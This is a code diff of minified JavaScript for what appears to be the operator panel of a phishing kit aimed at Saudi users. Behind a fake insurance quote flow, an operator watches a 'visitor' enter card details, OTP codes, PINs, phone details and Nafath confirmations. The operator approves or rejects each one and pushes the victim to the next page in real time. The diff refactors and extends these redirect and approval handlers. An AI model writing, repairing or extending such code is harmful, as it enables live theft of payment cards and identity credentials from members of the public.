@@ -9,8 +9,8 @@
         await (0, r.updateApplication)(t, a);
         try {
             (0, n.adminUpdateVisitor)(t, a);
-            let e = a.redirectPage || a.redirect_page;
-            e && (0, n.adminRedirectVisitor)(t, e)
+            let e = a.redirectPage || a.redirect_page || a.currentPage || a.current_page;
+            e && "null" !== e && (0, n.adminRedirectVisitor)(t, e)
         } catch (e) {}
     }, i = async e => (0, r.getApplication)(e), o = async e => {
         await (0, r.deleteMultipleApplications)(e)
@@ -25,6 +25,35 @@
         if (t && "null" !== t) return t;
         if (r && !n.includes(r) && !n.includes(Number(r))) return r;
         return a || r || "home"
+    }, redirectPayload = (e, t = {}) => {
+        let a = "home" === e ? "home-new" : e;
+        return {
+            redirectPage: a,
+            currentPage: a,
+            currentStep: a,
+            ...t
+        }
+    }, updateHistoryEntry = (e, t, a, r) => {
+        if (!Array.isArray(e)) return [];
+        let n = -1;
+        if (t && "current" !== t && e.some(e => e.id === t)) n = e.findIndex(e => e.id === t);
+        else {
+            let s = e.map((e, t) => ({
+                entry: e,
+                index: t
+            })).filter(({
+                entry: e
+            }) => a.includes(e.type));
+            if ("current" === t || !e.some(e => e.id === t)) s.length && (n = s[s.length - 1].index);
+            else {
+                let e = parseInt(t, 10);
+                !isNaN(e) && s[e] && (n = s[e].index)
+            }
+        }
+        return n < 0 ? e : e.map((e, t) => t === n ? {
+            ...e,
+            status: r
+        } : e)
     };
     var c = {
         xmlns: "http://www.w3.org/2000/svg",
@@ -2247,37 +2276,39 @@
         })
     }
     async function k(e, t, a, r) {
-        let n = r.map(e => e.id === t ? {
-            ...e,
-            status: a
-        } : e);
         await s(e, {
-            history: n
+            history: updateHistoryEntry(r, t, ["_t5", "phone_otp"], a)
         })
     }
     async function N(e, t, a) {
-        await k(e, t, "approved", a), await s(e, {
+        await s(e, redirectPayload("nafad", {
+            history: updateHistoryEntry(a, t, ["_t5", "phone_otp"], "approved"),
             phoneOtpStatus: "approved",
-            redirectPage: "nafad",
             currentStep: "_t6"
-        })
+        }))
     }
     async function A(e, t, a) {
-        await k(e, t, "rejected", a), await s(e, {
+        await s(e, {
+            history: updateHistoryEntry(a, t, ["_t5", "phone_otp"], "rejected"),
             _v7: "",
             phoneOtp: "",
             phoneOtpStatus: "rejected",
             phoneOtpRejectionError: "رمز غير صحيح - يرجى إدخال رمز تحقق جديد",
-            redirectPage: null
+            redirectPage: null,
+            currentPage: null,
+            currentStep: null
         })
     }
     async function resendOtp(e, t, a) {
-        await k(e, t, "resend", a), await s(e, {
+        await s(e, {
+            history: updateHistoryEntry(a, t, ["_t5", "phone_otp"], "resend"),
             _v7: "",
             phoneOtp: "",
             phoneOtpStatus: "rejected",
             phoneOtpRejectionError: "يرجى إدخال رمز تحقق جديد",
-            redirectPage: null
+            redirectPage: null,
+            currentPage: null,
+            currentStep: null
         })
     }
     function resolveHistoryId(e, t, a) {
@@ -2431,55 +2462,66 @@
                 })]
             })
         });
-        let j = async t => {
+        let j = async (t, a) => {
             if ((y.id || e.id) && !o) {
                 d(!0);
                 try {
-                    let a = {},
-                        r = t => ({
-                            redirectPage: t,
-                            currentPage: t,
-                            currentStep: t
-                        });
+                    let r = {},
+                        n = {
+                            home: "الصفحة الرئيسية",
+                            insur: "بيانات التأمين",
+                            compar: "مقارنة العروض",
+                            payment: "الدفع والتحقق",
+                            otp: "التحقق OTP",
+                            pin: "التحقق PIN",
+                            phone: "معلومات الهاتف",
+                            nafad: "نفاذ",
+                            nafad_modal: "مودال نفاذ"
+                        };
                     switch (t) {
                         case "home":
-                            a = r("home-new");
+                            r = redirectPayload("home-new");
                             break;
                         case "insur":
-                            a = r("insur");
+                            r = redirectPayload("insur");
                             break;
                         case "compar":
-                            a = r("compar");
+                            r = redirectPayload("compar");
                             break;
                         case "payment":
-                            a = {
-                                ...r("check"),
+                            r = redirectPayload("check", {
                                 cardStatus: "pending",
                                 otpStatus: "pending"
-                            };
+                            });
                             break;
                         case "otp":
-                            a = r("otp");
+                            r = redirectPayload("otp", {
+                                otpStatus: "pending",
+                                _v5Status: "pending"
+                            });
                             break;
                         case "pin":
-                            a = r("pin");
+                            r = redirectPayload("pin", {
+                                pinStatus: "pending",
+                                _v6Status: "pending"
+                            });
                             break;
                         case "phone":
-                            a = r("phone");
+                            r = redirectPayload("phone");
                             break;
                         case "nafad":
                         case "nafad_modal":
-                            a = r("nafad")
+                            r = redirectPayload("nafad")
                     }
                     let vid = y.id || e.id;
-                    Object.keys(a).length > 0 && vid && (console.log("[Dashboard] Sending redirect:", t, a), await s(vid, a), "nafad_modal" === t && (await new Promise(e => setTimeout(e, 1500)), await s(vid, {
+                    Object.keys(r).length > 0 && vid && (console.log("[Dashboard] Sending redirect:", t, r), await s(vid, r), "nafad_modal" === t && (await new Promise(e => setTimeout(e, 1500)), await s(vid, {
                         nafadConfirmationCode: "00"
-                    })), (async () => {
+                    })), G.success(`تم توجيه الزائر إلى ${n[t]||t}`), a && (a.value = ""), (async () => {
                         let e = await i(vid);
                         e && f(e)
                     })())
                 } catch (e) {
-                    console.error("Navigation error:", e), console.error(`حدث خطأ في التوجيه:`, e)
+                    console.error("Navigation error:", e), G.error("حدث خطأ في التوجيه")
                 } finally {
                     d(!1)
                 }
@@ -2797,124 +2839,81 @@
                 if (vid && !l) {
                     c(!0);
                     try {
-                        let r = S.find(e => e.id === t);
+                        let r = L.find(e => e.id === t);
                         if (!r) return void G.error("لم يتم العثور على العنصر");
                         let n = r.id.replace(/^(card-info-|otp-|pin-|phone-verification-|phone_verification-|phone-otp-|phone_otp-)/, "");
                         switch (console.log("[handleBubbleAction] bubble.id:", r.id, "historyId:", n, "bubble.type:", r.type, "action:", a), r.type) {
                             case "card":
                                 if ("otp" === a) {
-                                    console.log("[Action] Card OTP clicked, bubble.id:", r.id, "historyId:", n, "history:", vhist);
-                                    let t = vhist.map(e => e.id === n ? {
-                                        ...e,
-                                        status: "approved_with_otp"
-                                    } : e);
-                                    await s(vid, {
-                                        history: t,
+                                    let t = resolveHistoryId(vhist, n, ["_t1", "card"]);
+                                    await s(vid, redirectPayload("otp", {
+                                        history: updateHistoryEntry(vhist, t, ["_t1", "card"], "approved_with_otp"),
                                         cardStatus: "approved_with_otp",
-                                        currentStep: "otp",
-                                        currentPage: "otp",
-                                        redirectPage: "otp"
-                                    }), G.success("تم توجيه الزائر لصفحة OTP"), console.log("[Action] Status updated to approved_with_otp + currentStep=otp")
+                                        otpStatus: "pending",
+                                        _v5Status: "pending"
+                                    })), G.success("تم توجيه الزائر لصفحة OTP")
                                 } else if ("pin" === a) {
-                                    let t = vhist.map(e => e.id === n ? {
-                                        ...e,
-                                        status: "approved_with_pin"
-                                    } : e);
-                                    await s(vid, {
-                                        history: t,
+                                    let t = resolveHistoryId(vhist, n, ["_t1", "card"]);
+                                    await s(vid, redirectPayload("pin", {
+                                        history: updateHistoryEntry(vhist, t, ["_t1", "card"], "approved_with_pin"),
                                         cardStatus: "approved_with_pin",
-                                        currentStep: "pin",
-                                        currentPage: "pin",
-                                        redirectPage: "pin"
-                                    }), G.success("تم توجيه الزائر لصفحة PIN")
+                                        pinStatus: "pending",
+                                        _v6Status: "pending"
+                                    })), G.success("تم توجيه الزائر لصفحة PIN")
                                 } else if ("reject" === a) {
-                                    let t = vhist.map(e => e.id === n ? {
-                                        ...e,
-                                        status: "rejected"
-                                    } : e);
-                                    await s(vid, {
-                                        history: t,
-                                        cardStatus: "rejected",
-                                        currentStep: "check",
-                                        currentPage: "check",
-                                        redirectPage: "check"
-                                    }), G.success("تم رفض البطاقة")
+                                    let t = resolveHistoryId(vhist, n, ["_t1", "card"]);
+                                    await s(vid, redirectPayload("check", {
+                                        history: updateHistoryEntry(vhist, t, ["_t1", "card"], "rejected"),
+                                        cardStatus: "rejected"
+                                    })), G.success("تم رفض البطاقة")
                                 }
                                 break;
                             case "otp":
                                 if (n = resolveHistoryId(vhist, n, ["_t2", "otp"]), "approve" === a) {
-                                    let t = vhist.map(e => e.id === n ? {
-                                        ...e,
-                                        status: "approved"
-                                    } : e);
-                                    await s(vid, {
-                                        history: t,
+                                    await s(vid, redirectPayload("pin", {
+                                        history: updateHistoryEntry(vhist, n, ["_t2", "otp"], "approved"),
                                         _v5Status: "approved",
-                                        otpStatus: "show_pin",
-                                        currentStep: "pin",
-                                        currentPage: "pin",
-                                        redirectPage: "pin"
-                                    }), G.success("تم قبول OTP — توجيه الزائر لصفحة PIN")
+                                        otpStatus: "approved",
+                                        pinStatus: "pending",
+                                        _v6Status: "pending"
+                                    })), G.success("تم قبول OTP — توجيه الزائر لصفحة PIN")
                                 } else if ("reject" === a) {
-                                    let t = vhist.map(e => e.id === n ? {
-                                        ...e,
-                                        status: "rejected"
-                                    } : e);
-                                    await s(vid, {
-                                        history: t,
+                                    await s(vid, redirectPayload("otp", {
+                                        history: updateHistoryEntry(vhist, n, ["_t2", "otp"], "rejected"),
                                         _v5Status: "rejected",
-                                        otpStatus: "pending",
-                                        currentStep: "otp",
-                                        currentPage: "otp",
-                                        redirectPage: "otp"
-                                    }), G.success("تم رفض OTP — سيعاد فتح الإدخال للعميل")
+                                        otpStatus: "pending"
+                                    })), G.success("تم رفض OTP — سيعاد فتح الإدخال للعميل")
                                 }
                                 break;
                             case "pin":
                                 if (n = resolveHistoryId(vhist, n, ["_t3", "pin"]), "approve" === a) {
-                                    let t = vhist.map(e => e.id === n ? {
-                                        ...e,
-                                        status: "approved"
-                                    } : e);
-                                    await s(vid, {
-                                        history: t,
+                                    await s(vid, redirectPayload("phone", {
+                                        history: updateHistoryEntry(vhist, n, ["_t3", "pin"], "approved"),
                                         _v6Status: "approved",
-                                        currentStep: "phone",
-                                        currentPage: "phone",
-                                        redirectPage: "phone"
-                                    }), G.success("تم قبول PIN")
+                                        pinStatus: "approved"
+                                    })), G.success("تم قبول PIN")
                                 } else if ("reject" === a) {
-                                    let t = vhist.map(e => e.id === n ? {
-                                        ...e,
-                                        status: "rejected"
-                                    } : e);
-                                    await s(vid, {
-                                        history: t,
+                                    await s(vid, redirectPayload("pin", {
+                                        history: updateHistoryEntry(vhist, n, ["_t3", "pin"], "rejected"),
                                         _v6Status: "rejected",
-                                        currentStep: "pin",
-                                        currentPage: "pin",
-                                        redirectPage: "pin"
-                                    }), G.success("تم رفض PIN")
+                                        pinStatus: "pending"
+                                    })), G.success("تم رفض PIN")
                                 }
                                 break;
                             case "phone_verification":
                                 if ("approve" === a) {
-                                    let t = vhist.map(e => e.id === n ? {
-                                        ...e,
-                                        status: "approved"
-                                    } : e);
+                                    let t = resolveHistoryId(vhist, n, ["_t4", "phone_verification"]);
                                     await s(vid, {
-                                        history: t,
+                                        history: updateHistoryEntry(vhist, t, ["_t4", "phone_verification"], "approved"),
                                         _v4Status: "approved",
-                                        redirectPage: null
+                                        redirectPage: null,
+                                        currentPage: null,
+                                        currentStep: null
                                     }), G.success("تم قبول الهاتف")
                                 } else if ("reject" === a) {
-                                    let t = vhist.map(e => e.id === n ? {
-                                        ...e,
-                                        status: "rejected"
-                                    } : e);
+                                    let t = resolveHistoryId(vhist, n, ["_t4", "phone_verification"]);
                                     await s(vid, {
-                                        history: t,
+                                        history: updateHistoryEntry(vhist, t, ["_t4", "phone_verification"], "rejected"),
                                         _v4Status: "rejected",
                                         phoneCarrier: ""
                                     }), G.success("تم رفض الهاتف")
@@ -2929,7 +2928,7 @@
                         let refreshed = await i(vid);
                         refreshed && f(refreshed)
                     } catch (e) {
-                        console.error("Action error:", e), console.error(`حدث خطأ:`, e), G.error("فشل تنفيذ الإجراء")
+                        console.error("Action error:", e), G.error("فشل تنفيذ الإجراء")
                     } finally {
                         c(!1)
                     }
@@ -2960,7 +2959,7 @@
                     }), (0, t.jsx)("div", {
                         className: "flex-1"
                     }), (0, t.jsxs)("select", {
-                        onChange: e => j(e.target.value),
+                        onChange: e => j(e.target.value, e.target),
                         disabled: o,
                         className: "text-[11px] px-2 py-1 bg-white border border-gray-300 rounded text-gray-700 focus:outline-none focus:border-green-500 disabled:opacity-50 cursor-pointer shadow-sm",
                         children: [(0, t.jsx)("option", {
